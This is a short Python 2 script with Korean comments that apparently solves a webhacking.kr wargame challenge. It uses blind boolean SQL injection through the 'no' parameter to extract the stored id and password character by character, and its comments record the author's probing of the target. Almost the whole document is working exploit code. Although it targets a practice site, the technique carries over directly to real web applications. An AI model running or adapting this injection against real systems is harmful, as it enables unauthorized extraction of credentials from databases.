#-*- coding: utf-8 -*-
import urllib2
import CookieConstants

baseUrl  = "http://webhacking.kr/challenge/bonus/bonus-1/index.php"
idParam  = "no=2%%20and%%20if(substr(id,%d,1)in(%s),1,0)"
pwParam  = "no=2%%20and%%20if(substr(pw,%d,1)in(%s),1,0)"
answerId = ""
answerPw = ""
answer   = ""

# 1. 주소를 봤을 때 no, id, pw가 있으니 id부터 구해보자
# exists select * from ? where no=#{no}로 생각하고 시작
# 0을 넣었을떄 result가 없고 1과 2는 True, 나머진 False로 추정 => row가 두개(둘다 해보면 될듯)
# 2는 false인데 2 or 1=1 하니까 잘 되는걸 보니 필터는 없다
# and조건으로 id를 찾아보자
print "1. find id"
for caretIndex in range(1, 6):
    print "    [%02d] extract..." % (caretIndex), 
    for charIndex in range(ord('a'), ord('z')):
        httpRequest = urllib2.Request(baseUrl + "?" + idParam % (caretIndex, hex(charIndex)))
        httpRequest.add_header("Cookie", CookieConstants.sessionId)
        httpResponse = urllib2.urlopen(httpRequest).read()
        if str(httpResponse).find("True") >= 0:
            print chr(charIndex)
            answerId += chr(charIndex)
            break

print "result >> [%s]" % answerId
print 
print "2. find pw"

for caretIndex in range(1, 20):
    print "    [%02d] extract..." % (caretIndex), 
    for charIndex in range(ord('a'), ord('z')):
        httpRequest = urllib2.Request(baseUrl + "?" + pwParam % (caretIndex, hex(charIndex)))
        httpRequest.add_header("Cookie", CookieConstants.sessionId)
        httpResponse = urllib2.urlopen(httpRequest).read()
        if str(httpResponse).find("True") >= 0:
            print chr(charIndex)
            answerPw += chr(charIndex)
            break

print "result >> [%s]" % answerPw